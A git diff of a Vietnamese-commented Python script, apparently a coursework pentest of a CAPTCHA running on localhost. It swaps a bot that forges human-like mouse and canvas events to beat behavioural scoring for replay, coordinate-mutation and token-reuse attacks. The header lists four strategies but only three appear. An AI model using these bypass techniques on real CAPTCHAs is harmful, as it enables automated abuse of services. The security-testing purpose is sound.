@@ -1,36 +1,40 @@
 """
-Bot_advanced.py — 4 chiến lược bypass behavioral scoring (PHIÊN BẢN SỬA LỖI)
+Attack_Captcha.py — Task 4: Kiểm tra bảo mật hệ thống CAPTCHA
+================================================================
+4 chiến lược tấn công:
+  [A] Replay Attack        — Ghi lại request hợp lệ rồi gửi lại nhiều lần
+  [B] Sửa tọa độ          — Lấy token thật, chỉnh sửa tọa độ puzzle/canvas
+  [C] Reuse Token          — Dùng cùng 1 token cho nhiều request khác nhau
 
-SỬA LỖI CHÍNH (áp dụng cho tất cả 4 chiến lược):
-  1. [FIX COORD]  Mọi puzzle builder phải nhận target_x và kết thúc tại
-                  x = target_x / TRACK_WIDTH.  Bản cũ luôn kết thúc x=1.0
-                  hoặc dùng target_x_norm không nhất quán → "Coordinate mismatch".
-  2. [FIX SHAPE]  get_token() đọc thêm targetPoints, canvasWidth, canvasHeight.
-                  _wrap() truyền chúng vào build_canvas_events() để vẽ đúng polygon.
-  3. [FIX v3]     build_v3_puzzle() nhận target_x_norm tính sẵn từ _wrap() thay vì
-                  tính riêng với /300 dễ nhầm.
+Mỗi chiến lược in ra kết quả chi tiết và thống kê tổng cuối.
 
-CHIẾN LƯỢC GIỮ NGUYÊN:
-  v1 — Gaussian timing (slow-start / fast-middle / slow-end)
-  v2 — Ease-in-out + micro-pause 10% + y-jitter ±0.012
-  v3 — Overshoot + tremor correction
-  v4 — Speed burst giữa chừng
+GHI CHÚ: File này chỉ dùng để kiểm tra (pentest) hệ thống CAPTCHA do chính bạn
+         xây dựng hoặc được phép kiểm tra.
 """
-import json, math, time, random
+
+import copy
+import json
+import math
+import random
+import time
+import threading
 import requests
+
+# ─── Cấu hình ────────────────────────────────────────────────────────────────
 
 API_URL    = "http://127.0.0.1:5000/captcha/verify"
 API_INIT   = "http://127.0.0.1:5000/captcha/init"
-N_REQUESTS = 12
 TRACK_WIDTH = 300
 
+# Số lượng request cho mỗi chiến lược
+REPLAY_COUNT    = 8    # [A] Replay bao nhiêu lần
+COORD_COUNT     = 6    # [B] Bao nhiêu biến thể tọa độ
+REUSE_COUNT     = 8    # [C] Dùng lại token bao nhiêu lần
 
-# ─── Token ────────────────────────────────────────────────────────────────────
+# ─── Helpers chung ────────────────────────────────────────────────────────────
 
 def get_token(retries=5, delay=15.0):
-    """
-    [SỬA LỖI #2] Trả về thêm target_points, canvas_w, canvas_h.
-    """
+    """Lấy token mới từ server."""
     for attempt in range(retries):
         try:
             r = requests.get(API_INIT, timeout=3)
@@ -54,15 +58,12 @@ def get_token(retries=5, delay=15.0):
     return None, None, [], 300, 150
 
 
-# ─── Canvas event builder ─────────────────────────────────────────────────────
+def ease_in_out(t):
+    return 3 * t**2 - 2 * t**3
+
 
 def build_canvas_events(target_points, canvas_w=300, canvas_h=150, start_t=0):
-    """
-    [SỬA LỖI #2] Vẽ đúng polygon server yêu cầu.
-    - Nội suy 12 bước giữa mỗi cặp đỉnh kề (CW theo index).
-    - Jitter ≤ 0.003 norm (≈ 0.9px) → luôn trong HIT_RADIUS=12px.
-    - Khép kín về điểm đầu → dist=0 << CLOSE_RADIUS=15px.
-    """
+    """Dựng sự kiện canvas theo polygon từ server."""
     STEPS_PER_SEG = 12
     events = []
     t = start_t
@@ -96,8 +97,8 @@ def build_canvas_events(target_points, canvas_w=300, canvas_h=150, start_t=0):
 
     pts_norm = [norm(p["x"], p["y"]) for p in pts_px]
     pts_loop  = pts_norm + [pts_norm[0]]
-
     first_event = True
+
     for seg in range(len(pts_loop) - 1):
         x0, y0 = pts_loop[seg]
         x1, y1 = pts_loop[seg + 1]
@@ -125,127 +126,19 @@ def build_canvas_events(target_points, canvas_w=300, canvas_h=150, start_t=0):
     return events, t
 
 
-# ─── Puzzle event builders ────────────────────────────────────────────────────
-
-def ease_in_out(t):
-    return 3 * t**2 - 2 * t**3
-
-
-def build_v1_puzzle(target_norm, n_points=28, start_t=0):
-    """
-    [SỬA #1] Nhận target_norm thay vì luôn đến 1.0.
-    Chiến lược: Gaussian timing — slow-start, fast-middle, slow-end.
-    """
-    events = []
-    t = start_t
-    for i in range(n_points):
-        progress = i / (n_points - 1)
-        x  = round(progress * target_norm, 4)   # ← scale về target_norm
-        y  = round(0.50 + random.uniform(-0.010, 0.010), 4)
-        mean_dt = 30 - 15 * math.sin(progress * math.pi)
-        dt = max(8, int(random.gauss(mean_dt, 5)))
-        if random.random() < 0.06:
-            dt += random.randint(40, 100)
-        t += dt
-        speed = round((target_norm / (n_points - 1)) / max(dt, 1), 6)
-        events.append({"x": x, "y": y, "t": t, "dt": dt, "speed": speed,
-                       "type": "mousemove" if i > 0 else "mousedown",
-                       "area": "puzzle"})
-    # mouseup tại đúng target_norm
-    t += random.randint(15, 30)
-    events.append({"x": target_norm, "y": round(0.50 + random.uniform(-0.01, 0.01), 4),
-                   "t": t, "dt": t - events[-1]["t"],
-                   "speed": 0.0, "type": "mouseup", "area": "puzzle"})
-    return events
-
-
-def build_v2_puzzle(target_norm, n_points=32, start_t=0):
-    """
-    [SỬA #1] Nhận target_norm.
-    Chiến lược: ease-in-out + micro-pause 10% + y-jitter ±0.012.
-    """
+def build_puzzle_events(target_norm, n_points=28, start_t=0):
+    """Dựng sự kiện kéo puzzle cơ bản (ease-in-out + jitter)."""
     events = []
     t = start_t
     prev_x, prev_y = 0.0, 0.50
-    for i in range(n_points):
-        progress = i / (n_points - 1)
-        x  = round(ease_in_out(progress) * target_norm, 4)   # ← scale
-        y  = round(0.50 + random.uniform(-0.012, 0.012), 4)
-        dt = random.randint(13, 28)
-        if random.random() < 0.10:
-            dt += random.randint(55, 130)
-        t += dt
-        dist  = math.sqrt((x - prev_x)**2 + (y - prev_y)**2)
-        speed = round(dist / max(dt, 1), 6)
-        events.append({"x": x, "y": y, "t": t, "dt": dt, "speed": speed,
-                       "type": "mousemove" if i > 0 else "mousedown",
-                       "area": "puzzle"})
-        prev_x, prev_y = x, y
-    t += random.randint(15, 30)
-    events.append({"x": target_norm, "y": round(0.50 + random.uniform(-0.01, 0.01), 4),
-                   "t": t, "dt": t - events[-1]["t"],
-                   "speed": 0.0, "type": "mouseup", "area": "puzzle"})
-    return events
-
-
-def build_v3_puzzle(target_norm, start_t=0):
-    """
-    [SỬA #1 + #3] Nhận target_norm đã tính từ _wrap().
-    Chiến lược: overshoot → correction + micro tremor.
-    Overshoot tối đa min(target_norm+0.08, 1.0) để không vượt biên.
-    """
-    overshoot = min(1.0, target_norm + random.uniform(0.04, 0.10))
-    events = []
-    t = start_t
-
-    def add_segment(x0, x1, n, y_base=0.50):
-        nonlocal t
-        for i in range(n):
-            prog = i / max(n - 1, 1)
-            x = round(x0 + (x1 - x0) * ease_in_out(prog), 4)
-            y = round(y_base + random.uniform(-0.004, 0.004) +
-                      random.gauss(0, 0.002), 4)
-            dt = random.randint(14, 30)
-            t += dt
-            events.append({"x": x, "y": y, "t": t, "dt": dt, "speed": 0.0,
-                           "type": "mousemove", "area": "puzzle"})
-
-    # mousedown đầu tiên
-    t += 0
-    events.append({"x": 0.0, "y": 0.50, "t": t, "dt": 0, "speed": 0.0,
-                   "type": "mousedown", "area": "puzzle"})
-
-    add_segment(0.0, overshoot, n=22)
-    t += random.randint(80, 200)   # pause tại overshoot
-    add_segment(overshoot, target_norm, n=10)
-
-    t += 20
-    events.append({"x": target_norm, "y": 0.50, "t": t, "dt": 20,
-                   "speed": 0.0, "type": "mouseup", "area": "puzzle"})
-    return events
-
-
-def build_v4_puzzle(target_norm, n_points=26, start_t=0):
-    """
-    [SỬA #1] Nhận target_norm.
-    Chiến lược: speed burst — chậm → nhanh giữa chừng → chậm lại.
-    """
-    events = []
-    t = start_t
-    burst_start = int(n_points * 0.40)
-    burst_end   = int(n_points * 0.60)
-    prev_x, prev_y = 0.0, 0.50
 
     for i in range(n_points):
         progress = i / (n_points - 1)
-        x  = round(ease_in_out(progress) * target_norm, 4)   # ← scale
+        x  = round(ease_in_out(progress) * target_norm, 4)
         y  = round(0.50 + random.uniform(-0.010, 0.010), 4)
-        if burst_start <= i < burst_end:
-            dt = random.randint(7, 13)
-        else:
-            dt = random.randint(20, 40)
-        if random.random() < 0.06:
-            dt += random.randint(50, 110)
+        dt = random.randint(13, 35)
+        if random.random() < 0.07:
+            dt += random.randint(50, 120)
         t += dt
         dist  = math.sqrt((x - prev_x)**2 + (y - prev_y)**2)
         speed = round(dist / max(dt, 1), 6)
@@ -254,44 +147,25 @@ def build_v4_puzzle(target_norm, n_points=26, start_t=0):
                        "area": "puzzle"})
         prev_x, prev_y = x, y
 
-    t += 20
-    events.append({"x": target_norm, "y": 0.50, "t": t, "dt": 20,
-                   "speed": 0.0, "type": "mouseup", "area": "puzzle"})
+    t += random.randint(15, 30)
+    events.append({"x": target_norm, "y": 0.50, "t": t,
+                   "dt": t - events[-1]["t"], "speed": 0.0,
+                   "type": "mouseup", "area": "puzzle"})
     return events
 
 
-# ─── Wrap payload ────────────────────────────────────────────────────────────
-
-def _wrap(puzzle_events_fn, **kwargs):
-    """
-    [SỬA LỖI #2 + #1]
-    - Đọc targetPoints từ get_token(), truyền vào build_canvas_events().
-    - Tính target_norm = target_x / TRACK_WIDTH, truyền vào mọi puzzle builder.
-    """
+def build_fresh_payload():
+    """Dựng payload hợp lệ hoàn chỉnh từ token mới."""
     token, target_x, target_points, canvas_w, canvas_h = get_token()
-    if token is None:
+    if not token:
         return None
 
-    think_time = random.uniform(0.8, 2.5)
-    print(f"    think={think_time:.2f}s  target_x={target_x}"
-          f"  pts={len(target_points)} ...", end=" ", flush=True)
-    time.sleep(think_time)
-
-    # Canvas events — vẽ đúng polygon
     canvas_evts, canvas_end = build_canvas_events(
         target_points, canvas_w, canvas_h, start_t=0
     )
-
-    # Puzzle events — bắt đầu sau canvas + gap
-    gap     = random.randint(300, 700)
-    p_start = canvas_end + gap
-
-    # [SỬA #1] target_norm nhất quán cho tất cả builders
+    gap = random.randint(300, 700)
     target_norm = round(target_x / TRACK_WIDTH, 4)
-
-    puzzle_evts = puzzle_events_fn(
-        target_norm=target_norm, start_t=p_start, **kwargs
-    )
+    puzzle_evts = build_puzzle_events(target_norm, start_t=canvas_end + gap)
 
     return {
         "token":         token,
@@ -303,95 +177,332 @@ def _wrap(puzzle_events_fn, **kwargs):
     }
 
 
-def build_advanced_bot_v1(): return _wrap(build_v1_puzzle)
-def build_advanced_bot_v2(): return _wrap(build_v2_puzzle)
-def build_advanced_bot_v3(): return _wrap(build_v3_puzzle)
-def build_advanced_bot_v4(): return _wrap(build_v4_puzzle)
-
-
-# ─── Attack ───────────────────────────────────────────────────────────────────
-
-def attack(payload, label, idx):
-    n_canvas = sum(1 for e in payload["events"] if e.get("area") == "canvas")
-    n_puzzle = sum(1 for e in payload["events"] if e.get("area") == "puzzle")
-    dur = payload["events"][-1]["t"] - payload["events"][0]["t"]
-    print(f"\n[{idx+1}] {label} — canvas={n_canvas} puzzle={n_puzzle} dur={dur}ms")
+def send_payload(payload, label=""):
+    """Gửi payload lên server và trả về kết quả."""
     try:
-        r       = requests.post(API_URL, json=payload, timeout=5)
-        result  = r.json()
-        verdict = result.get("result", "?")
-        score   = result.get("score", "?")
-        msg     = result.get("msg", "")
-        print(f"    HTTP {r.status_code} → result={verdict}  score={score}"
-              + (f"  [{msg}]" if msg else ""))
-        return {"label": label, "result": verdict, "score": score}
+        r = requests.post(API_URL, json=payload, timeout=5)
+        d = r.json()
+        return {
+            "label":   label,
+            "http":    r.status_code,
+            "result":  d.get("result", "?"),
+            "score":   d.get("score", "?"),
+            "msg":     d.get("msg", ""),
+        }
     except requests.exceptions.ConnectionError:
-        result  = offline_score(payload)
-        verdict = result.get("result", "?")
-        score   = result.get("score", "?")
-        print(f"    (offline) result={verdict}  score={score}")
-        return {"label": label, "result": verdict, "score": score}
+        return {"label": label, "http": 0, "result": "offline", "score": None, "msg": ""}
     except Exception as e:
-        print(f"    {e}")
-        return None
+        return {"label": label, "http": -1, "result": "error", "score": None, "msg": str(e)}
 
 
-def offline_score(payload):
-    import sys, os
-    sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "Backend"))
-    from scoring_logic import BehaviorScorer
-    return BehaviorScorer(payload).analyze_behavior()
+def print_result(idx, res):
+    msg_part = f"  [{res['msg']}]" if res.get("msg") else ""
+    print(f"  [{idx+1:02d}] HTTP {res['http']:>3} → result={res['result']:<6}  "
+          f"score={res['score']}{msg_part}")
 
 
-# ─── Main ─────────────────────────────────────────────────────────────────────
+def print_section(title):
+    print(f"\n{'='*68}")
+    print(f"  {title}")
+    print(f"{'='*68}")
+
+
+def summarize(results, title="Tổng kết"):
+    if not results:
+        print("  Không có kết quả.\n")
+        return
+    passed = [r for r in results if r.get("result") == "human"]
+    scores = [r["score"] for r in results
+              if isinstance(r.get("score"), (int, float))]
+    rate = len(passed) / len(results) * 100
+    avg  = round(sum(scores) / len(scores), 3) if scores else "n/a"
+    mn   = round(min(scores), 3) if scores else "n/a"
+    mx   = round(max(scores), 3) if scores else "n/a"
+
+    http_429 = sum(1 for r in results if r.get("http") == 429)
+    http_400 = sum(1 for r in results if r.get("http") == 400)
+
+    print(f"\n  ► {title}")
+    print(f"    Bypass (result=human): {len(passed)}/{len(results)}  ({rate:.1f}%)")
+    print(f"    Score: avg={avg}  min={mn}  max={mx}")
+    if http_429 or http_400:
+        print(f"    Server chặn: 429 Rate-limit={http_429}  400 Bad={http_400}")
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# [A] REPLAY ATTACK — Ghi lại 1 request hợp lệ rồi gửi lại nhiều lần
+# ═══════════════════════════════════════════════════════════════════════════════
+
+def attack_replay(n=REPLAY_COUNT):
+    """
+    Mục tiêu kiểm tra:
+      - Server có nhận ra token đã dùng không? (token blacklist)
+      - Cùng 1 bộ event_signature có bị chặn lần 2 không?
+      - Timestamp cũ có bị phát hiện không?
+    """
+    print_section("[A] REPLAY ATTACK")
+    print("  Bước 1: Lấy 1 payload hợp lệ...")
+
+    original = build_fresh_payload()
+    if not original:
+        print("  [!] Không lấy được payload gốc.")
+        return []
+
+    print(f"  Token: {original['token'][:20]}...  target_x={original['user_x']}")
+    print(f"  Bước 2: Gửi lại {n} lần (không đổi gì)...\n")
+
+    results = []
+    for i in range(n):
+        # Giữ nguyên TOÀN BỘ payload — kể cả token và startTime
+        payload = copy.deepcopy(original)
+        res = send_payload(payload, label="replay")
+        results.append(res)
+        print_result(i, res)
+        time.sleep(random.uniform(0.3, 0.8))
+
+    summarize(results, "Replay Attack")
+    return results
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# [B] SỬA TỌA ĐỘ — Lấy token thật, chỉnh user_x và tọa độ cuối cùng
+# ═══════════════════════════════════════════════════════════════════════════════
+
+def _mutate_coords(payload, strategy="random_x"):
+    """
+    Trả về bản sao payload đã bị chỉnh tọa độ theo strategy:
+      "random_x"    — đặt user_x ngẫu nhiên [0, TRACK_WIDTH], sửa điểm mouseup
+      "zero_x"      — đặt user_x = 0 (chưa kéo gì)
+      "overflow_x"  — đặt user_x > TRACK_WIDTH (kéo quá biên)
+      "wrong_end"   — giữ user_x đúng nhưng điểm mouseup lệch xa
+      "all_zero"    — toàn bộ x của puzzle = 0 (không di chuyển)
+      "teleport"    — event cuối nhảy thẳng tới đích, bỏ hành trình
+    """
+    p = copy.deepcopy(payload)
+
+    puzzle_events = [e for e in p["events"] if e.get("area") == "puzzle"]
+    other_events  = [e for e in p["events"] if e.get("area") != "puzzle"]
+
+    if strategy == "random_x":
+        new_x = random.randint(10, TRACK_WIDTH - 10)
+        p["user_x"] = new_x
+        new_norm = round(new_x / TRACK_WIDTH, 4)
+        for e in puzzle_events:
+            if e["type"] == "mouseup":
+                e["x"] = new_norm
+
+    elif strategy == "zero_x":
+        p["user_x"] = 0
+        for e in puzzle_events:
+            e["x"] = 0.0
+
+    elif strategy == "overflow_x":
+        p["user_x"] = TRACK_WIDTH + random.randint(20, 80)
+        for e in puzzle_events:
+            if e["type"] == "mouseup":
+                e["x"] = round(p["user_x"] / TRACK_WIDTH, 4)
+
+    elif strategy == "wrong_end":
+        # user_x đúng, nhưng mouseup lệch ±0.25 norm
+        for e in puzzle_events:
+            if e["type"] == "mouseup":
+                original_x = e["x"]
+                offset = random.choice([-1, 1]) * random.uniform(0.20, 0.35)
+                e["x"] = round(max(0.0, min(1.0, original_x + offset)), 4)
+
+    elif strategy == "all_zero":
+        for e in puzzle_events:
+            e["x"] = 0.0
+        p["user_x"] = 0
+
+    elif strategy == "teleport":
+        # Bỏ toàn bộ mousemove, chỉ giữ mousedown + mouseup
+        target_norm = round(p["user_x"] / TRACK_WIDTH, 4)
+        t_base = other_events[-1]["t"] if other_events else 0
+        puzzle_events = [
+            {"x": 0.0, "y": 0.5, "t": t_base + 50,  "dt": 50,  "speed": 0.0,
+             "type": "mousedown", "area": "puzzle"},
+            {"x": target_norm, "y": 0.5, "t": t_base + 80, "dt": 30, "speed": 0.0,
+             "type": "mouseup",   "area": "puzzle"},
+        ]
+
+    p["events"] = other_events + puzzle_events
+    return p
+
+
+COORD_STRATEGIES = [
+    "random_x",
+    "zero_x",
+    "overflow_x",
+    "wrong_end",
+    "all_zero",
+    "teleport",
+]
+
+
+def attack_mutate_coords(n=COORD_COUNT):
+    """
+    Mục tiêu kiểm tra:
+      - Server có xác thực user_x khớp với tọa độ mouseup không?
+      - Server có từ chối tọa độ ngoài biên không?
+      - Phát hiện teleport (thiếu hành trình chuột) không?
+    """
+    print_section("[B] SỬA TỌA ĐỘ (Coordinate Mutation)")
+    print(f"  Lấy {n} token mới, mỗi token áp dụng 1 chiến lược sửa tọa độ...\n")
+
+    results = []
+    for i in range(n):
+        strategy = COORD_STRATEGIES[i % len(COORD_STRATEGIES)]
+        print(f"  [{i+1:02d}] strategy={strategy:<12}", end="  ")
+
+        base = build_fresh_payload()
+        if not base:
+            print("[!] skip — không lấy được token")
+            continue
+
+        payload = _mutate_coords(base, strategy)
+        res = send_payload(payload, label=strategy)
+        results.append(res)
+
+        msg_part = f"  [{res['msg']}]" if res.get("msg") else ""
+        print(f"HTTP {res['http']:>3} → result={res['result']:<6}  "
+              f"score={res['score']}{msg_part}")
+        time.sleep(random.uniform(0.4, 1.0))
+
+    summarize(results, "Coordinate Mutation")
+    return results
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# [C] REUSE TOKEN — Dùng cùng 1 token nhiều lần với payload khác nhau
+# ═══════════════════════════════════════════════════════════════════════════════
+
+def attack_reuse_token(n=REUSE_COUNT):
+    """
+    Mục tiêu kiểm tra:
+      - [C1] Token Blacklist: cùng token + events MỚI mỗi lần
+             → Server chặn vì "token đã dùng" (token blacklist)
+      - [C2] Event Fingerprinting: token MỚI + events Y CHANG lần đầu
+             → Nếu server chặn → có event-fingerprint detection
+             → Nếu server chấp nhận → chỉ có token blacklist, không có event check
+    """
+    print_section("[C] REUSE TOKEN  +  EVENT FINGERPRINTING")
+
+    # ── Sub-test C1: Token Blacklist ──────────────────────────────────────────
+    print("  [C1] Token Blacklist — token giữ nguyên, events mới mỗi lần")
+    print("  Bước 1: Lấy 1 token duy nhất...")
+
+    token, target_x, target_points, canvas_w, canvas_h = get_token()
+    if not token:
+        print("  [!] Không lấy được token.")
+        return []
+
+    print(f"  Token: {token[:20]}...  target_x={target_x}")
+    print(f"  Bước 2: Gửi {n} request, tất cả dùng TOKEN này (events khác nhau)...\n")
+
+    results_c1 = []
+    frozen_events = None  # Lưu lại events lần đầu để dùng cho C2
+
+    for i in range(n):
+        canvas_evts, canvas_end = build_canvas_events(
+            target_points, canvas_w, canvas_h, start_t=0
+        )
+        gap = random.randint(200, 800)
+        target_norm = round(target_x / TRACK_WIDTH, 4)
+        puzzle_evts = build_puzzle_events(target_norm, start_t=canvas_end + gap)
+        all_events = canvas_evts + puzzle_evts
+
+        if i == 0:
+            frozen_events = copy.deepcopy(all_events)  # Đóng băng events lần 1
+
+        payload = {
+            "token":         token,          # GIỐNG NHAU mọi lần
+            "user_x":        target_x,
+            "startTime":     int(time.time() * 1000),
+            "device":        "mouse",
+            "expectedShape": f"polygon_{len(target_points)}pts",
+            "events":        all_events,
+        }
+
+        tag = "1st" if i == 0 else f"{i+1}th-reuse"
+        res = send_payload(payload, label=tag)
+        results_c1.append(res)
+        print_result(i, res)
+        time.sleep(random.uniform(0.5, 1.2))
+
+    summarize(results_c1, "[C1] Token Blacklist")
+
+    # ── Sub-test C2: Event Fingerprinting ─────────────────────────────────────
+    print("\n  [C2] Event Fingerprinting — token MỚI nhưng events Y CHANG lần đầu")
+    print("       Mục tiêu: server chặn → có event fingerprint; pass → không có\n")
+
+    if frozen_events is None:
+        print("  [!] Không có frozen events để test C2.")
+        return results_c1
+
+    results_c2 = []
+    n_fp = max(3, n // 2)  
+
+    for i in range(n_fp):
+        # Lấy token HOÀN TOÀN MỚI
+        new_token, new_tx, _, _, _ = get_token()
+        if not new_token:
+            print(f"  [{i+1:02d}] [!] Không lấy được token mới — bỏ qua")
+            continue
+
+        # Dùng lại ĐÚNG BỘ EVENTS đã đóng băng từ C1 lần đầu
+        payload = {
+            "token":         new_token,              #  TOKEN MỚI
+            "user_x":        target_x,
+            "startTime":     int(time.time() * 1000),  #  startTime cập nhật
+            "device":        "mouse",
+            "expectedShape": f"polygon_{len(target_points)}pts",
+            "events":        copy.deepcopy(frozen_events),  #  EVENTS CŨ Y CHANG
+        }
+
+        tag = f"fp-{i+1}"
+        res = send_payload(payload, label=tag)
+        results_c2.append(res)
+        print_result(i, res)
+        time.sleep(random.uniform(0.5, 1.2))
+
+    summarize(results_c2, "[C2] Event Fingerprinting")
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# Main
+# ═══════════════════════════════════════════════════════════════════════════════
 
 if __name__ == "__main__":
-    STRATEGIES = [
-        ("v1 – Gaussian timing",               build_advanced_bot_v1),
-        ("v2 – Ease-in-out + micro-pause 10%", build_advanced_bot_v2),
-        ("v3 – Overshoot + tremor correction", build_advanced_bot_v3),
-        ("v4 – Speed burst",                   build_advanced_bot_v4),
-    ]
+    import argparse
 
-    print("=" * 70)
-    print("BOT NÂNG CAO (SỬA LỖI) — Bypass scoring bằng dữ liệu mô phỏng người thật")
-    print("  Fix: puzzle x → target_norm | canvas → polygon thật | v3 overshoot clamped")
-    print("=" * 70)
+    parser = argparse.ArgumentParser(
+        description="Kiểm tra bảo mật CAPTCHA "
+    )
+    parser.add_argument(
+        "--attack", "-a",
+        choices=["replay", "coords", "reuse", "spam", "all"],
+        default="all",
+        help="Chọn chiến lược tấn công (mặc định: all)",
+    )
+    args = parser.parse_args()
 
-    all_results = []
-    for idx in range(N_REQUESTS):
-        label, builder = STRATEGIES[idx % len(STRATEGIES)]
-        print(f"\n[{idx+1}] Đang build {label}...")
-        payload = builder()
-        if payload is None:
-            print(f"  → Bỏ qua — không lấy được token")
-            time.sleep(2.0)
-            continue
-        res = attack(payload, label, idx)
-        if res:
-            all_results.append(res)
-        time.sleep(random.uniform(4.0, 6.0))
+    print("=" * 68)
+    print("  CAPTCHA SECURITY TESTER ")
+    print("  Các chiến lược: Replay | Sửa tọa độ | Reuse Token ")
+    print("=" * 68)
 
-    print("\n" + "=" * 70)
-    print(" Tổng kết theo chiến lược:")
-    for strat_label, _ in STRATEGIES:
-        subset = [r for r in all_results if r["label"] == strat_label]
-        if not subset:
-            continue
-        passed = [r for r in subset if r["result"] == "human"]
-        scores = [r["score"] for r in subset if isinstance(r.get("score"), (int, float))]
-        avg_s  = round(sum(scores) / len(scores), 3) if scores else "n/a"
-        print(f"   {strat_label}")
-        print(f"     → {len(passed)}/{len(subset)} BYPASS ({len(passed)/len(subset)*100:.0f}%)  "
-              f"avg_score={avg_s}")
+    all_results = {}
 
-    if all_results:
-        total_passed = [r for r in all_results if r["result"] == "human"]
-        scores_all   = [r["score"] for r in all_results if isinstance(r.get("score"), (int, float))]
-        print(f"\n   Tổng bypass: {len(total_passed)}/{len(all_results)} = "
-              f"{len(total_passed)/len(all_results)*100:.1f}%")
-        if scores_all:
-            print(f"   Score: avg={sum(scores_all)/len(scores_all):.3f}  "
-                  f"min={min(scores_all):.3f}  max={max(scores_all):.3f}")
-    else:
-        print("\n   Không có kết quả nào")
+    if args.attack in ("replay", "all"):
+        all_results["replay"] = attack_replay()
+        time.sleep(2.0)
+
+    if args.attack in ("coords", "all"):
+        all_results["coords"] = attack_mutate_coords()
+        time.sleep(2.0)
+
+    if args.attack in ("reuse", "all"):
+        all_results["reuse"] = attack_reuse_token()
+        time.sleep(2.0)
+
+    print()
